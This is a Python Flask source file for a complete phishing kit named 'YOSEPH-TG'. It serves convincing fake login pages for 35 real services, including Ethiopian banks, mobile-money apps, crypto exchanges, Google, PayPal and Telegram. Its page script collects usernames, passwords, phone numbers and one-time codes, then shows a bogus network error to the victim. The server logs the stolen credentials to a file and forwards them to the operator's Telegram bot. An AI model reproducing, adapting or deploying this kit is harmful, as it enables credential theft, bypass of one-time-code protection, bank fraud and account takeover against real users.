import os
import sys
import time
import json
import base64
import datetime
import urllib.request
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# ==========================================
# 1. SYSTEM CONFIGURATION & IDENTITY
# ==========================================
TOOL_NAME = "YOSEPH-TG"
VERSION = "13.0.0 (GHOST OMNIVERSE)"
DEVELOPER = "Yoseph Alganeh"
CONFIG_FILE = "system_data.json"
LOG_FILE = "captured_credentials.txt"

# Access Password: @Yosephalganeh44
ENCRYPTED_KEY = "QFlvc2VwaGFsZ2FuZWg0NA=="

# ==========================================
# 2. MASSIVE DATABASE (35+ TARGETS)
# ==========================================
TEMPLATES = {
    "1": {"name": "Telegram", "color": "#0088cc", "logo": "https://telegram.org/img/t_logo.png", "type": "phone", "msg": "Sign in to Telegram"},
    "2": {"name": "Telebirr", "color": "#00a9e0", "logo": "https://upload.wikimedia.org/wikipedia/en/thumb/5/5f/Telebirr_logo.png/220px-Telebirr_logo.png", "type": "phone", "msg": "Mobile Money Portal"},
    "3": {"name": "Binance", "color": "#f3ba2f", "logo": "https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg", "type": "login", "msg": "Secure Crypto Login", "txt": "black"},
    "4": {"name": "MetaTrader 5", "color": "#005596", "logo": "https://www.metatrader5.com/m/metatrader5-logo.png", "type": "login", "msg": "Trading Terminal Access"},
    "5": {"name": "CBE Birr", "color": "#5d2d91", "logo": "https://www.combanketh.et/images/logo.png", "type": "phone", "msg": "Commercial Bank of Ethiopia"},
    "6": {"name": "Facebook", "color": "#1877f2", "logo": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg", "type": "login", "msg": "Connect with friends"},
    "7": {"name": "Instagram", "color": "#e1306c", "logo": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg", "type": "login", "msg": "Log in to see photos"},
    "8": {"name": "Google", "color": "#ffffff", "logo": "https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg", "type": "login", "msg": "Use your Google Account", "txt": "black"},
    "9": {"name": "Exness", "color": "#ffc107", "logo": "https://upload.wikimedia.org/wikipedia/commons/4/4b/Exness_Logo.svg", "type": "login", "msg": "Global Broker Login", "txt": "black"},
    "10": {"name": "TikTok", "color": "#000000", "logo": "https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg", "type": "login", "msg": "Log in to TikTok"},
    "11": {"name": "WhatsApp", "color": "#25d366", "logo": "https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg", "type": "phone", "msg": "Verify your number"},
    "12": {"name": "Abay Bank", "color": "#006837", "logo": "https://abaybank.com.et/wp-content/uploads/2021/05/logo.png", "type": "phone", "msg": "Mobile Banking System"},
    "13": {"name": "Netflix", "color": "#e50914", "logo": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg", "type": "login", "msg": "Unlimited movies, TV shows"},
    "14": {"name": "PayPal", "color": "#003087", "logo": "https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg", "type": "login", "msg": "Pay, Send, Save"},
    "15": {"name": "GitHub", "color": "#24292e", "logo": "https://upload.wikimedia.org/wikipedia/commons/9/91/Octicons-mark-github.svg", "type": "login", "msg": "Sign in to GitHub"},
    "16": {"name": "Trust Wallet", "color": "#3375bb", "logo": "https://trustwallet.com/assets/images/media/assets/trust_platform.png", "type": "login", "msg": "Access Decentralized Assets"},
    "17": {"name": "LinkedIn", "color": "#0077b5", "logo": "https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png", "type": "login", "msg": "Welcome to your professional community"},
    "18": {"name": "X / Twitter", "color": "#000000", "logo": "https://upload.wikimedia.org/wikipedia/commons/5/57/X_logo_2023_(white).svg", "type": "login", "msg": "Sign in to X"},
    "19": {"name": "Discord", "color": "#5865f2", "logo": "https://upload.wikimedia.org/wikipedia/commons/7/73/Discord_Color_Text_Logo.svg", "type": "login", "msg": "Welcome back! We're so excited to see you again!"},
    "20": {"name": "Snapchat", "color": "#fffc00", "logo": "https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg", "type": "login", "msg": "Log in to Snapchat", "txt": "black"},
    "21": {"name": "Amazon", "color": "#232f3e", "logo": "https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg", "type": "login", "msg": "Sign-In"},
    "22": {"name": "Steam", "color": "#171a21", "logo": "https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg", "type": "login", "msg": "Sign in with your Steam account"},
    "23": {"name": "Apple ID", "color": "#000000", "logo": "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg", "type": "login", "msg": "Manage your Apple account"},
    "24": {"name": "Microsoft", "color": "#00a4ef", "logo": "https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg", "type": "login", "msg": "Sign in to your account"},
    "25": {"name": "Reddit", "color": "#ff4500", "logo": "https://upload.wikimedia.org/wikipedia/commons/5/58/Reddit_logo_new.svg", "type": "login", "msg": "Dive into anything"},
    "26": {"name": "Pinterest", "color": "#bd081c", "logo": "https://upload.wikimedia.org/wikipedia/commons/0/08/Pinterest-logo.png", "type": "login", "msg": "Welcome to Pinterest"},
    "27": {"name": "Airbnb", "color": "#ff5a5f", "logo": "https://upload.wikimedia.org/wikipedia/commons/6/69/Airbnb_Logo_B%C3%A9lo.svg", "type": "login", "msg": "Log in or sign up"},
    "28": {"name": "Coinbase", "color": "#0052ff", "logo": "https://upload.wikimedia.org/wikipedia/commons/c/c2/Coinbase_Logo_2013.png", "type": "login", "msg": "Sign in to your exchange"},
    "29": {"name": "Spotify", "color": "#1db954", "logo": "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg", "type": "login", "msg": "Log in to Spotify"},
    "30": {"name": "Awash Bank", "color": "#004b87", "logo": "https://www.awashbank.com/wp-content/uploads/2020/01/awash-bank-logo.png", "type": "phone", "msg": "Nurturing Growth"},
    "31": {"name": "Dashen Bank", "color": "#005b82", "logo": "https://dashenbanksc.com/wp-content/uploads/2021/03/dashen-logo.png", "type": "phone", "msg": "Always One Step Ahead"},
    "32": {"name": "Oromia Bank", "color": "#e31837", "logo": "https://oromiabank.com/wp-content/uploads/2022/10/logo.png", "type": "phone", "msg": "Serving to Empower"},
    "33": {"name": "Bybit", "color": "#f7a600", "logo": "https://upload.wikimedia.org/wikipedia/commons/8/87/Bybit_logo.svg", "type": "login", "msg": "Next Level Trading", "txt": "black"},
    "34": {"name": "KuCoin", "color": "#24ae8f", "logo": "https://upload.wikimedia.org/wikipedia/commons/8/8c/KuCoin_logo.svg", "type": "login", "msg": "People's Exchange"},
    "35": {"name": "OKX", "color": "#000000", "logo": "https://upload.wikimedia.org/wikipedia/commons/c/c7/OKX_Logo.svg", "type": "login", "msg": "Trade Crypto Better"}
}

# ==========================================
# 3. CORE FUNCTIONS (CLEAN BANNER)
# ==========================================
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def check_internet():
    try:
        urllib.request.urlopen('http://google.com', timeout=2)
        return True
    except:
        return False

def print_banner():
    # Removed IP and Device as requested by user
    print(f"""\033[96m
 ╔═══════════════════════════════════════════════════════════════════╗
 ║  \033[93m█▄─█─▄█─▄▄─█─▄▄▄─█▄─▄▄─█─█─█─▀█▄─▄▄─█\033[96m                    ║
 ║  \033[93m─█─▀─██─█─║█─█─▄█─█─█─║█─█─█──█─█─║█\033[96m                    ║
 ║  \033[93m─▀───▀▀▄▄▀▀▀▄▄▄▀▀▄▄▀▀▀▀▀▀▀▀▀──▀▄▄▀▀▀\033[96m                    ║
 ╠═══════════════════════════════════════════════════════════════════╣
 ║  \033[97mDEVELOPER : \033[92m{DEVELOPER}\033[96m                               ║
 ║  \033[97mVERSION   : \033[93m{VERSION}\033[96m                                   ║
 ║  \033[97mMODULES   : \033[92m35+ Premium Templates Loaded\033[96m                ║
 ╚═══════════════════════════════════════════════════════════════════╝\033[0m""")

def authenticate():
    clear()
    print_banner()
    print("\n\033[94m[*] System Initializing...\033[0m")
    key = input("\033[93m[?] Enter Master Access Password: \033[0m").strip()
    if key != base64.b64decode(ENCRYPTED_KEY).decode():
        print("\033[91m[!] ACCESS DENIED. INCORRECT PASSWORD.\033[0m")
        sys.exit()
    print("\033[92m[+] Access Granted! Welcome Yoseph.\033[0m")
    time.sleep(1)

def setup_config():
    if not os.path.exists(CONFIG_FILE):
        clear()
        print_banner()
        print("\n\033[95m--- Initial Setup (Telegram Bot Integration) ---\033[0m")
        token = input("\033[93m[?] Bot Token: \033[0m").strip()
        chat_id = input("\033[93m[?] Chat ID: \033[0m").strip()
        config_data = {"token": token, "chat_id": chat_id}
        with open(CONFIG_FILE, "w") as f:
            json.dump(config_data, f)
        return config_data
    else:
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)

# ==========================================
# 4. GHOST HTML TEMPLATE (NO FOOTER NAME, SMART LOGO, ULTRA CSS)
# ==========================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification | {{ name }}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* CSS Animations and Keyframes */
        @keyframes gradientShift { 
            0% { background-position: 0% 50%; } 
            50% { background-position: 100% 50%; } 
            100% { background-position: 0% 50%; } 
        }
        @keyframes popIn { 
            0% { opacity: 0; transform: scale(0.85) translateY(30px); } 
            100% { opacity: 1; transform: scale(1) translateY(0); } 
        }
        @keyframes pulseShadow { 
            0%, 100% { box-shadow: 0 0 15px {{ color }}40; } 
            50% { box-shadow: 0 0 35px {{ color }}90; } 
        }
        @keyframes spinPulse {
            0% { transform: rotate(0deg) scale(1); opacity: 0.8; }
            50% { transform: rotate(180deg) scale(1.2); opacity: 0.3; }
            100% { transform: rotate(360deg) scale(1); opacity: 0.8; }
        }
        @keyframes slideRight {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        /* Core Styling */
        body { 
            background: #040608; 
            color: #ffffff; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            overflow: hidden; 
            margin: 0;
            padding: 0;
        }
        
        .dynamic-bg { 
            background: linear-gradient(-45deg, #020305, #0a111a, #05070a, #111e30); 
            background-size: 400% 400%; 
            animation: gradientShift 18s ease infinite; 
            height: 100vh; 
            width: 100vw;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        /* Orb effects in background */
        .ambient-orb-1 {
            position: absolute; top: -10%; left: -10%; width: 50vw; height: 50vw;
            background: radial-gradient(circle, {{ color }}33 0%, transparent 70%);
            border-radius: 50%; filter: blur(60px); z-index: 1;
            animation: spinPulse 20s infinite linear reverse;
        }
        .ambient-orb-2 {
            position: absolute; bottom: -10%; right: -10%; width: 60vw; height: 60vw;
            background: radial-gradient(circle, {{ color }}22 0%, transparent 70%);
            border-radius: 50%; filter: blur(80px); z-index: 1;
            animation: spinPulse 25s infinite linear;
        }

        /* Glassmorphism Card */
        .premium-glass { 
            background: rgba(20, 25, 35, 0.4); 
            backdrop-filter: blur(25px); 
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.05); 
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            animation: popIn 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards; 
            z-index: 10;
        }

        /* Smart Logo Fallback Styling */
        .logo-container {
            width: 90px; height: 90px;
            margin: 0 auto;
            border-radius: 22px;
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.08);
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            overflow: hidden;
            position: relative;
        }
        
        .logo-img {
            width: 65%; height: 65%; object-fit: contain;
            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.3));
            transition: all 0.3s;
        }

        .logo-fallback {
            display: none; /* Hidden by default */
            width: 100%; height: 100%;
            background: linear-gradient(135deg, {{ color }}, #2a2a2a);
            color: {{ text_color|default('white') }};
            font-size: 42px; font-weight: 900;
            align-items: center; justify-content: center;
            text-transform: uppercase;
        }

        /* Input Elements */
        .input-field { 
            background: rgba(0,0,0,0.35); 
            border: 1.5px solid rgba(255,255,255,0.08); 
            color: white;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); 
            font-size: 16px;
        }
        .input-field:focus { 
            border-color: {{ color }}; 
            background: rgba(0,0,0,0.6); 
            box-shadow: 0 0 20px {{ color }}33; 
            outline: none; 
            transform: translateY(-2px);
        }
        .input-field::placeholder { color: rgba(255,255,255,0.3); }

        /* Buttons */
        .action-btn { 
            background: {{ color }}; 
            color: {{ text_color|default('white') }};
            transition: all 0.3s ease; 
            animation: pulseShadow 3s infinite alternate; 
            position: relative;
            overflow: hidden;
        }
        .action-btn::after {
            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transform: translateX(-100%);
        }
        .action-btn:hover::after { animation: slideRight 1.5s infinite; }
        .action-btn:hover { 
            filter: brightness(1.15); 
            transform: translateY(-3px) scale(1.02); 
            box-shadow: 0 15px 35px {{ color }}60; 
        }
        .action-btn:active { transform: translateY(1px) scale(0.98); }

        /* Custom Loading Bar */
        .custom-loader-wrapper {
            width: 100%; height: 4px;
            background: rgba(255,255,255,0.05);
            border-radius: 10px; overflow: hidden;
            position: relative;
            margin: 30px auto;
        }
        .custom-loader-bar {
            position: absolute; left: -50%; width: 50%; height: 100%;
            background: {{ color }};
            border-radius: 10px;
            animation: slideRight 1.5s infinite linear;
            box-shadow: 0 0 10px {{ color }};
        }
    </style>
</head>
<body>
    <div class="dynamic-bg">
        <div class="ambient-orb-1"></div>
        <div class="ambient-orb-2"></div>
        
        <div class="premium-glass p-10 md:p-14 rounded-[2.5rem] w-full max-w-[420px] mx-5 text-center">
            
            <div class="mb-8 relative">
                <div class="logo-container">
                    <img src="{{ logo }}" 
                         onerror="this.style.display='none'; document.getElementById('logo-text').style.display='flex';" 
                         class="logo-img" alt="Logo">
                    <div id="logo-text" class="logo-fallback">{{ name[0] }}</div>
                </div>
            </div>
            
            <h1 class="text-3xl font-black tracking-tight mb-2 text-white/90">{{ name }}</h1>
            <p class="text-white/40 text-[13px] mb-10 font-medium px-4 tracking-wide">{{ msg }}</p>

            <div id="auth-container" class="space-y-6">
                {% if type == 'phone' %}
                    <div class="text-left space-y-2">
                        <label class="text-[10px] font-bold uppercase tracking-[0.2em] text-white/40 ml-4">Registered Phone</label>
                        <input type="tel" id="input_1" placeholder="+251 9... / 09..." class="input-field w-full p-5 rounded-2xl font-bold tracking-wider">
                    </div>
                    <button onclick="processStep1()" class="action-btn w-full p-5 font-black rounded-2xl text-[13px] tracking-[0.15em] uppercase mt-2">
                        Continue Securely
                    </button>
                {% else %}
                    <div class="space-y-4">
                        <input type="text" id="input_1" placeholder="Email or Username" class="input-field w-full p-5 rounded-2xl">
                        <input type="password" id="input_2" placeholder="Password" class="input-field w-full p-5 rounded-2xl">
                    </div>
                    <button onclick="processFinal()" class="action-btn w-full p-5 font-black rounded-2xl text-[13px] tracking-[0.15em] uppercase mt-2">
                        Secure Sign In
                    </button>
                {% endif %}
            </div>

            <div id="loading-screen" class="hidden py-10">
                <div class="custom-loader-wrapper w-[70%]">
                    <div class="custom-loader-bar"></div>
                </div>
                <p class="text-[10px] font-bold text-white/40 uppercase tracking-[0.3em] animate-pulse">Establishing Secure Connection...</p>
            </div>

            <p id="error-message" class="mt-8 text-[11px] font-bold text-[#ff4444] uppercase tracking-wider h-4 opacity-0 transition-opacity duration-300"></p>

            <div class="mt-12 pt-8 border-t border-white/5 flex justify-center space-x-6 opacity-30">
                <span class="text-[9px] font-bold uppercase tracking-widest cursor-pointer hover:text-white transition">Terms</span>
                <span class="text-[9px] font-bold uppercase tracking-widest cursor-pointer hover:text-white transition">Privacy</span>
                <span class="text-[9px] font-bold uppercase tracking-widest cursor-pointer hover:text-white transition">Help</span>
            </div>
        </div>
    </div>

    <script>
        let capturedData = "";

        // Function for Phone/OTP flow
        async function processStep1() {
            capturedData = document.getElementById('input_1').value.trim();
            if(capturedData.length < 8) {
                showError("Invalid Number Format");
                return;
            }
            
            toggleUI(true);
            await sendPayload({u: capturedData, p: '[WAITING_FOR_OTP]'});
            
            setTimeout(() => {
                toggleUI(false);
                document.getElementById('auth-container').innerHTML = `
                    <div class="text-left space-y-2 popIn-animation">
                        <label class="text-[10px] font-bold uppercase tracking-[0.2em] text-white/40 ml-4">Verification Code (OTP)</label>
                        <input type="number" id="input_2" placeholder="00000" class="input-field w-full p-5 rounded-2xl text-center text-3xl font-black tracking-[0.5em]">
                    </div>
                    <button onclick="processFinal()" class="action-btn w-full p-5 font-black rounded-2xl text-[13px] tracking-[0.15em] uppercase mt-4">
                        Verify Code
                    </button>
                `;
            }, 2500);
        }

        // Function for Password/Final OTP flow
        async function processFinal() {
            let u = capturedData || document.getElementById('input_1').value.trim();
            let p = document.getElementById('input_2').value.trim();
            
            if(p.length < 4) {
                showError("Invalid Entry");
                return;
            }

            toggleUI(true);
            await sendPayload({u: u, p: p});
            
            setTimeout(() => {
                toggleUI(false);
                showError("Network Timeout: Connection reset by peer. Error 0x800A0007");
            }, 3000);
        }

        async function sendPayload(data) {
            try { 
                await fetch('/post_data', {
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'}, 
                    body: JSON.stringify(data)
                }); 
            } catch(e) {
                console.log("Transmission error");
            }
        }

        function toggleUI(isLoading) {
            document.getElementById('auth-container').classList.toggle('hidden', isLoading);
            document.getElementById('loading-screen').classList.toggle('hidden', !isLoading);
            document.getElementById('error-message').style.opacity = '0';
        }

        function showError(msg) {
            const err = document.getElementById('error-message');
            err.innerText = msg;
            err.style.opacity = '1';
        }
    </script>
</body>
</html>
"""

# ==========================================
# 5. FLASK BACKEND ROUTING
# ==========================================
@app.route('/')
def serve_template():
    # Render the ghost template with the selected target data
    txt_col = TARGET.get('txt', 'white')
    return render_template_string(
        HTML_TEMPLATE, 
        name=TARGET['name'], 
        color=TARGET['color'], 
        logo=TARGET['logo'], 
        type=TARGET['type'], 
        msg=TARGET['msg'], 
        text_color=txt_col
    )

@app.route('/post_data', methods=['POST'])
def receive_data():
    try:
        data = request.json
        current_time = datetime.datetime.now().strftime("%Y-%m-%d | %H:%M:%S")
        
        # Prepare the beautiful log format
        log_entry = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f" 🎯 TARGET HIT: {TARGET['name']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f" 👤 IDENTIFIER : {data.get('u', 'UNKNOWN')}\n"
            f" 🔑 SECRET     : {data.get('p', 'UNKNOWN')}\n"
            f" 🕒 TIMESTAMP  : {current_time}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        )
        
        # 1. Save to local log file
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry + "\n")
            
        # 2. Print to Terminal/Console
        print(f"\n\033[92m[+] NEW DATA CAPTURED!\033[0m")
        print(f"\033[97mUser: {data.get('u')} | Pass/OTP: {data.get('p')}\033[0m")
        
        # 3. Send to Telegram (If configured)
        if CONF and 'token' in CONF and 'chat_id' in CONF:
            tg_url = f"https://api.telegram.org/bot{CONF['token']}/sendMessage"
            payload = {
                "chat_id": CONF['chat_id'],
                "text": log_entry,
                "parse_mode": "HTML"
            }
            try:
                # Quick timeout so it doesn't hang the web server
                import requests
                requests.post(tg_url, json=payload, timeout=3)
            except Exception as e:
                pass # Ignore connection errors to Telegram silently
                
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error"}), 400

# ==========================================
# 6. MAIN EXECUTION & MENU SYSTEM
# ==========================================
if __name__ == '__main__':
    # Step 1: Login
    authenticate()
    
    # Step 2: Ensure Config Exists
    CONF = setup_config()
    
    # Step 3: Main Menu Loop
    while True:
        clear()
        print_banner()
        print("\033[95m\n  [ SELECT TARGET PLATFORM ]\033[0m\n")
        
        # Print items in a clean 2-column layout
        items = list(TEMPLATES.items())
        for i in range(0, len(items), 2):
            k1, v1 = items[i]
            line = f"  [\033[92m{k1:>2}\033[0m] \033[97m{v1['name']:<22}\033[0m"
            if i + 1 < len(items):
                k2, v2 = items[i+1]
                line += f"  [\033[92m{k2:>2}\033[0m] \033[97m{v2['name']:<22}\033[0m"
            print(line)
            
        print("\n  [\033[91m 0\033[0m] \033[91mExit System\033[0m")
        
        choice = input("\n\033[93m[YOSEPH-TG] > \033[0m").strip()
        
        if choice == '0':
            print("\n\033[91m[!] Shutting down server...\033[0m")
            sys.exit()
            
        elif choice in TEMPLATES:
            TARGET = TEMPLATES[choice]
            clear()
            print_banner()
            
            print(f"\n\033[92m[*] TARGET SELECTED: {TARGET['name']}\033[0m")
            print(f"\033[94m[*] Mode: {TARGET['type'].upper()}\033[0m")
            
            has_net = check_internet()
            net_status = "\033[92mOnline\033[0m" if has_net else "\033[91mOffline (Fallback Logos Active)\033[0m"
            print(f"\033[94m[*] Internet Status: {net_status}\033[0m")
            
            print(f"\033[93m[*] Local Web Server running on: http://0.0.0.0:5000\033[0m")
            print(f"\033[90m[*] Press CTRL+C to stop the server and return to menu.\033[0m\n")
            
            # Run Flask App
            try:
                # Disable Flask startup banner for a cleaner look
                import logging
                log = logging.getLogger('werkzeug')
                log.setLevel(logging.ERROR)
                
                app.run(host='0.0.0.0', port=5000, debug=False)
            except KeyboardInterrupt:
                print("\n\033[93m[!] Server stopped by user.\033[0m")
                time.sleep(1)
                continue # Go back to the menu
        else:
            print("\033[91m[!] Invalid choice. Try again.\033[0m")
            time.sleep(1.5)

